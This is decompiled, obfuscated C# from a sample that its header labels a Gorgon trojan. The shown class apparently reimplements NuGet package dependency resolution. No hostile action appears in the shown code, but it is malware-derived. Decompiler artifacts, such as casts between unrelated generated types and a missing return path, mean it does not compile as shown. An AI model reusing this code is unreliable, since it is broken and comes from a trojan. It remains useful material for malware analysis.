// Decompiled with JetBrains decompiler
// Type: kyqpa04foBQum.c4d5Y6oFpSqoy
// Assembly: 6xHrFwRAI8cwf, Version=5.6.0.5, Culture=neutral, PublicKeyToken=31bf3856ad364e35
// MVID: D0CFE593-D471-48A8-93C1-A7D99C557285
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-52701ab860194c1e24d9b820a6595d741329f7effc2bc27a8cf5e8263a36f055.exe

using \u0031cIlWpr8MlgjX;
using \u0036OZfARuq1fEvy;
using \u0039mEmxp2Jm3hqm;
using h4UBo6Oc0m3ZT;
using HhTNLHpXmSWoo;
using J09T0nrkAefDj;
using LJM0wF4cPfhBu;
using NuGet.Common;
using NuGet.Packaging;
using NuGet.Packaging.Core;
using NuGet.Protocol.Core.Types;
using NuGet.Versioning;
using O3eNiYziSSH50;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.Linq;
using System.Threading;
using UmijEqiMYGIft;
using XRP64mXd3d1uD;

namespace kyqpa04foBQum
{
  public class c4d5Y6oFpSqoy
  {
    public IEnumerable<PackageIdentity> \u0031G7cMtt6cUSMA(
      \u0033CHiAQm1Y6aVh BhiDGdcecjtuI,
      CancellationToken v6iHsAnjIfSAO)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      c4d5Y6oFpSqoy.lhN8fBt8lqQTj lhN8fBt8lqQtj = (c4d5Y6oFpSqoy.lhN8fBt8lqQTj) new JuGe0yG8GXbx1<>.RF4IxYSiA6KvB();
      Stopwatch stopwatch = new Stopwatch();
      v6iHsAnjIfSAO.ThrowIfCancellationRequested();
      if (BhiDGdcecjtuI == null)
        throw new ArgumentNullException("context");
      foreach (string str in BhiDGdcecjtuI.WWlEEQvuszN2e)
      {
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: variable of a compiler-generated type
        c4d5Y6oFpSqoy.JiWctxF8sHWdY jiWctxF8sHwdY = (c4d5Y6oFpSqoy.JiWctxF8sHWdY) new c4d5Y6oFpSqoy.lhN8fBt8lqQTj();
        // ISSUE: reference to a compiler-generated field
        ((c4d5Y6oFpSqoy.lhN8fBt8lqQTj) jiWctxF8sHwdY).jGryxlkldKbtJ = str;
        // ISSUE: reference to a compiler-generated method
        if (!BhiDGdcecjtuI.DGmM8CMmpOQ3T.Any<SourcePackageDependencyInfo>(new Func<SourcePackageDependencyInfo, bool>(jiWctxF8sHwdY.YMdAx5g8YI5wu)))
        {
          // ISSUE: reference to a compiler-generated field
          throw new Nn9qXOVmIEdU8(string.Format((IFormatProvider) CultureInfo.CurrentCulture, \u00335D02svxTXoZR.mK3mb65UX0oWh, (object) ((c4d5Y6oFpSqoy.lhN8fBt8lqQTj) jiWctxF8sHwdY).jGryxlkldKbtJ));
        }
      }
      List<string> values = new List<string>();
      PackageIdentity[] array = BhiDGdcecjtuI.B7RyNQb5oAi2j.Select<PackageReference, PackageIdentity>((Func<PackageReference, PackageIdentity>) (TSBkB934MbrxW => TSBkB934MbrxW.PackageIdentity)).ToArray<PackageIdentity>();
      foreach (PackageIdentity packageIdentity in array)
      {
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: variable of a compiler-generated type
        c4d5Y6oFpSqoy.\u0030HuI7kyTwHDOu obj = (c4d5Y6oFpSqoy.\u0030HuI7kyTwHDOu) new c4d5Y6oFpSqoy.JiWctxF8sHWdY();
        // ISSUE: reference to a compiler-generated field
        ((c4d5Y6oFpSqoy.JiWctxF8sHWdY) obj).NTEHwTFO35lZV = packageIdentity;
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: variable of a compiler-generated type
        c4d5Y6oFpSqoy.ini9afTDQXEDh ini9afTdqxeDh = (c4d5Y6oFpSqoy.ini9afTDQXEDh) new c4d5Y6oFpSqoy.\u0030HuI7kyTwHDOu();
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated method
        ((c4d5Y6oFpSqoy.\u0030HuI7kyTwHDOu) ini9afTdqxeDh).ZKc6dAO35NWwH = BhiDGdcecjtuI.DGmM8CMmpOQ3T.FirstOrDefault<SourcePackageDependencyInfo>(new Func<SourcePackageDependencyInfo, bool>(obj.WrZnwH8AHst90));
        // ISSUE: reference to a compiler-generated field
        if (((c4d5Y6oFpSqoy.\u0030HuI7kyTwHDOu) ini9afTdqxeDh).ZKc6dAO35NWwH != null)
        {
          // ISSUE: reference to a compiler-generated field
          IEnumerable<PackageDependency> source = c4d5Y6oFpSqoy.A12wbau9lF4n9(((c4d5Y6oFpSqoy.\u0030HuI7kyTwHDOu) ini9afTdqxeDh).ZKc6dAO35NWwH, (IEnumerable<PackageIdentity>) array);
          if (source != null && source.Any<PackageDependency>())
          {
            // ISSUE: reference to a compiler-generated method
            values.AddRange(source.Select<PackageDependency, string>(new Func<PackageDependency, string>(ini9afTdqxeDh.C3JwC18PIbCwh)));
          }
        }
        else
        {
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated method
          ((c4d5Y6oFpSqoy.\u0030HuI7kyTwHDOu) ini9afTdqxeDh).ZKc6dAO35NWwH = BhiDGdcecjtuI.DGmM8CMmpOQ3T.FirstOrDefault<SourcePackageDependencyInfo>(new Func<SourcePackageDependencyInfo, bool>(obj.xMCH5z6GF9cON));
          // ISSUE: reference to a compiler-generated field
          if (((c4d5Y6oFpSqoy.\u0030HuI7kyTwHDOu) ini9afTdqxeDh).ZKc6dAO35NWwH == null)
          {
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            string str = "'" + ((c4d5Y6oFpSqoy.JiWctxF8sHWdY) obj).NTEHwTFO35lZV.Id + " " + ((SemanticVersion) ((c4d5Y6oFpSqoy.JiWctxF8sHWdY) obj).NTEHwTFO35lZV.Version).ToNormalizedString() + "'";
            values.Add(str);
          }
        }
      }
      if (values.Count > 0)
        BhiDGdcecjtuI.SXQjyKweU7CK2.LogWarning(string.Format((IFormatProvider) CultureInfo.CurrentCulture, \u00335D02svxTXoZR.vGM99XCOZ9skw, (object) string.Join(", ", (IEnumerable<string>) values)));
      List<h9CthcyNW15VS> source1 = new List<h9CthcyNW15VS>();
      foreach (SourcePackageDependencyInfo packageDependencyInfo in c4d5Y6oFpSqoy.OSvYqfwANhELO(BhiDGdcecjtuI.DGmM8CMmpOQ3T, (ISet<string>) BhiDGdcecjtuI.WWlEEQvuszN2e))
      {
        IEnumerable<PackageDependency> dependencies = BhiDGdcecjtuI.\u0035mCxWgGtJFqA6 != LBFengGh2fvlZ.Ignore ? ((PackageDependencyInfo) packageDependencyInfo).Dependencies ?? Enumerable.Empty<PackageDependency>() : Enumerable.Empty<PackageDependency>();
        source1.Add(new h9CthcyNW15VS(((PackageIdentity) packageDependencyInfo).Id, ((PackageIdentity) packageDependencyInfo).Version, dependencies, packageDependencyInfo.Listed, false));
      }
      source1.Sort((IComparer<h9CthcyNW15VS>) PackageIdentityComparer.Default);
      HashSet<string> stringSet = new HashSet<string>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
      List<List<h9CthcyNW15VS>> ge0KPLIQW0NIQ = new List<List<h9CthcyNW15VS>>();
      foreach (IGrouping<string, h9CthcyNW15VS> source2 in source1.GroupBy<h9CthcyNW15VS, string>((Func<h9CthcyNW15VS, string>) (hWcx6B8HvLCoD => ((PackageIdentity) hWcx6B8HvLCoD).Id), (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase))
      {
        stringSet.Add(source2.Key);
        List<h9CthcyNW15VS> list = source2.ToList<h9CthcyNW15VS>();
        if (!BhiDGdcecjtuI.WWlEEQvuszN2e.Contains<string>(source2.Key, (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase))
          list.Add(new h9CthcyNW15VS(source2.Key, (NuGetVersion) null, (IEnumerable<PackageDependency>) null, true, true));
        ge0KPLIQW0NIQ.Add(list);
      }
      foreach (string id in source1.Where<h9CthcyNW15VS>((Func<h9CthcyNW15VS, bool>) (C5kVK6zdPsJI2 => ((PackageDependencyInfo) C5kVK6zdPsJI2).Dependencies != null)).SelectMany<h9CthcyNW15VS, string>((Func<h9CthcyNW15VS, IEnumerable<string>>) (AHu2VYVliNXoy => ((PackageDependencyInfo) AHu2VYVliNXoy).Dependencies.Select<PackageDependency, string>((Func<PackageDependency, string>) (_param1 => _param1.Id)).Distinct<string>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase))))
      {
        if (!stringSet.Contains(id))
        {
          stringSet.Add(id);
          ge0KPLIQW0NIQ.Add(new List<h9CthcyNW15VS>()
          {
            new h9CthcyNW15VS(id, (NuGetVersion) null, (IEnumerable<PackageDependency>) null, true, true)
          });
        }
      }
      v6iHsAnjIfSAO.ThrowIfCancellationRequested();
      // ISSUE: reference to a compiler-generated field
      ((JuGe0yG8GXbx1<>.RF4IxYSiA6KvB) lhN8fBt8lqQtj).c4MFSpc62GJNa = Enumerable.Empty<h9CthcyNW15VS>();
      // ISSUE: reference to a compiler-generated method
      Action<IEnumerable<h9CthcyNW15VS>> action = new Action<IEnumerable<h9CthcyNW15VS>>(lhN8fBt8lqQtj.svsT09fIgSmlm);
      pm18NjXWzfNgT pm18NjXwzfNgT = new pm18NjXWzfNgT(BhiDGdcecjtuI.\u0035mCxWgGtJFqA6, BhiDGdcecjtuI.yNlzqqmP2M8CZ, BhiDGdcecjtuI.y5NOl37cUl5wQ);
      // ISSUE: reference to a compiler-generated field
      IEnumerable<h9CthcyNW15VS> h9CthcyNw15Vses1 = (JuGe0yG8GXbx1<h9CthcyNW15VS>.FindSolution((IEnumerable<IEnumerable<h9CthcyNW15VS>>) KVNVQ1mUChdZF.rKfgwmlVVgnq5(ge0KPLIQW0NIQ, BhiDGdcecjtuI), (IComparer<h9CthcyNW15VS>) pm18NjXwzfNgT, new Func<h9CthcyNW15VS, h9CthcyNW15VS, bool>(wNDoTbnesoyM1.ornWB1Ggj6Tow), action) ?? throw new ejWHJVRbj7T5S(wNDoTbnesoyM1.\u0036tyBo3HJo7iyC(((JuGe0yG8GXbx1<>.RF4IxYSiA6KvB) lhN8fBt8lqQtj).c4MFSpc62GJNa, (IEnumerable<PackageDependencyInfo>) BhiDGdcecjtuI.DGmM8CMmpOQ3T, BhiDGdcecjtuI.B7RyNQb5oAi2j, (IEnumerable<string>) BhiDGdcecjtuI.y5NOl37cUl5wQ, BhiDGdcecjtuI.eOvF5B45dAZTi))).Where<h9CthcyNW15VS>((Func<h9CthcyNW15VS, bool>) (MM3XFY50WEWvK => !MM3XFY50WEWvK.\u0030lMv0Sgo77FLh));
      if (h9CthcyNw15Vses1.Any<h9CthcyNW15VS>())
      {
        IEnumerable<h9CthcyNW15VS> h9CthcyNw15Vses2 = wNDoTbnesoyM1.L9uDitPgbyJaC(h9CthcyNw15Vses1);
        IEnumerable<h9CthcyNW15VS> source3 = wNDoTbnesoyM1.\u0039EMlLCNHxdbmf(h9CthcyNw15Vses2);
        if (source3.Any<h9CthcyNW15VS>())
          throw new ejWHJVRbj7T5S(string.Format((IFormatProvider) CultureInfo.CurrentCulture, \u00335D02svxTXoZR.jh1K7MVgTSRKS, (object) string.Join(" => ", source3.Select<h9CthcyNW15VS, string>((Func<h9CthcyNW15VS, string>) (WqMxJI7J1iEiL => ((PackageIdentity) WqMxJI7J1iEiL).Id + " " + ((SemanticVersion) ((PackageIdentity) WqMxJI7J1iEiL).Version).ToNormalizedString())))));
        stopwatch.Stop();
        BhiDGdcecjtuI.SXQjyKweU7CK2.LogMinimal(string.Format(\u00335D02svxTXoZR.IP3E0z6KgH6SC, (object) DatetimeUtility.ToReadableTimeFormat(stopwatch.Elapsed)));
        return (IEnumerable<PackageIdentity>) h9CthcyNw15Vses2.ToArray<h9CthcyNW15VS>();
      }
    }

    private static IEnumerable<PackageDependency> A12wbau9lF4n9(
      SourcePackageDependencyInfo cif4HgSHJOU2n,
      IEnumerable<PackageIdentity> rhEDR7GJQ7XtJ)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      c4d5Y6oFpSqoy.gYMa5GiPZo6Vf gYma5GiPzo6Vf = new c4d5Y6oFpSqoy.gYMa5GiPZo6Vf(-2);
      // ISSUE: reference to a compiler-generated field
      ((c4d5Y6oFpSqoy.rCaLXNPBZFgWo) gYma5GiPzo6Vf).YSxszaufY99Wj = cif4HgSHJOU2n;
      // ISSUE: reference to a compiler-generated field
      ((c4d5Y6oFpSqoy.rCaLXNPBZFgWo) gYma5GiPzo6Vf).uBe8dSUNHMbyG = rhEDR7GJQ7XtJ;
      return (IEnumerable<PackageDependency>) gYma5GiPzo6Vf;
    }

    private static string qZus7oaooPU6A(
      SourcePackageDependencyInfo b489kJDh3pEAO,
      PackageDependency DnnkecWA68unk)
    {
      VersionRange versionRange = DnnkecWA68unk.VersionRange;
      string str = DnnkecWA68unk.Id + " " + (versionRange?.ToNonSnapshotRange().PrettyPrint() ?? string.Empty);
      return "'" + ((PackageIdentity) b489kJDh3pEAO).Id + " " + ((SemanticVersion) ((PackageIdentity) b489kJDh3pEAO).Version).ToNormalizedString() + " " + \u00335D02svxTXoZR.RqleAP6LNyxBL + ": " + str + "'";
    }

    private static IEnumerable<SourcePackageDependencyInfo> OSvYqfwANhELO(
      IEnumerable<SourcePackageDependencyInfo> pnpXLBa2E5Cvc,
      ISet<string> _param1)
    {
      List<SourcePackageDependencyInfo> packageDependencyInfoList = new List<SourcePackageDependencyInfo>(pnpXLBa2E5Cvc);
      List<SourcePackageDependencyInfo> TD3tKKIhwjE5z;
      do
      {
        TD3tKKIhwjE5z = packageDependencyInfoList;
        packageDependencyInfoList = c4d5Y6oFpSqoy.z7c6IVW9OA2eY(TD3tKKIhwjE5z, _param1);
      }
      while (packageDependencyInfoList.Count < TD3tKKIhwjE5z.Count);
      return (IEnumerable<SourcePackageDependencyInfo>) packageDependencyInfoList;
    }

    private static List<SourcePackageDependencyInfo> z7c6IVW9OA2eY(
      List<SourcePackageDependencyInfo> TD3tKKIhwjE5z,
      ISet<string> W0od2uKq8butm)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      c4d5Y6oFpSqoy.zStAK2sZdKOmf zStAk2sZdKomf = (c4d5Y6oFpSqoy.zStAK2sZdKOmf) new c4d5Y6oFpSqoy.rCaLXNPBZFgWo();
      // ISSUE: reference to a compiler-generated field
      zStAk2sZdKomf.iXa7iek2ZxJX2 = W0od2uKq8butm;
      if (TD3tKKIhwjE5z.Count == 0)
        return TD3tKKIhwjE5z;
      Dictionary<string, IList<VersionRange>> dictionary = new Dictionary<string, IList<VersionRange>>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
      foreach (SourcePackageDependencyInfo packageDependencyInfo in TD3tKKIhwjE5z)
      {
        if (!dictionary.ContainsKey(((PackageIdentity) packageDependencyInfo).Id))
          dictionary.Add(((PackageIdentity) packageDependencyInfo).Id, (IList<VersionRange>) new List<VersionRange>());
      }
      foreach (PackageDependencyInfo packageDependencyInfo in TD3tKKIhwjE5z)
      {
        foreach (PackageDependency dependency in packageDependencyInfo?.Dependencies)
        {
          IList<VersionRange> versionRangeList;
          if (dictionary.TryGetValue(dependency.Id, out versionRangeList))
            ((ICollection<VersionRange>) versionRangeList).Add(dependency.VersionRange);
        }
      }
      // ISSUE: reference to a compiler-generated field
      ((c4d5Y6oFpSqoy.rCaLXNPBZFgWo) zStAk2sZdKomf).\u0036xlt6Qs3PHTbc = new Dictionary<string, VersionRange>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
      foreach (KeyValuePair<string, IList<VersionRange>> keyValuePair in dictionary)
      {
        // ISSUE: reference to a compiler-generated field
        ((c4d5Y6oFpSqoy.rCaLXNPBZFgWo) zStAk2sZdKomf).\u0036xlt6Qs3PHTbc.Add(keyValuePair.Key, VersionRange.Combine((IEnumerable<VersionRange>) keyValuePair.Value));
      }
      // ISSUE: reference to a compiler-generated method
      return ((IEnumerable<SourcePackageDependencyInfo>) TD3tKKIhwjE5z).Where<SourcePackageDependencyInfo>(new Func<SourcePackageDependencyInfo, bool>(zStAk2sZdKomf.eZuwBbFyq00I4)).ToList<SourcePackageDependencyInfo>();
    }
  }
}
